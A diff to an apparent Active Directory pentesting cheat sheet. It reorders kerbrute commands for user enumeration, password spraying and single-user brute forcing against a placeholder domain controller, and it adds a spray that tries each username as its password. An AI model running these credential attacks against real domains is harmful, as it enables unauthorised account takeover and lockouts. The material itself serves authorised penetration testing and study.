@@ -12,8 +12,9 @@ then
 
 ```bash
 kerbrute userenum --dc $TARGET_IP -d $TARGET_AD users -t 100 -v
-kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users $PASSWORD -t 100 -v
-kerbrute bruteuser --dc $TARGET_IP -d $TARGET_AD passwords $USER -t 100 -v
+kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD -t 100 -v users $PASSWORD 
+kerbrute bruteuser --dc $TARGET_IP -d $TARGET_AD -t 100 -v passwords $USER
+kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users -t 100 -v --user-as-pass
 ```
 
 AS-REP Roasting
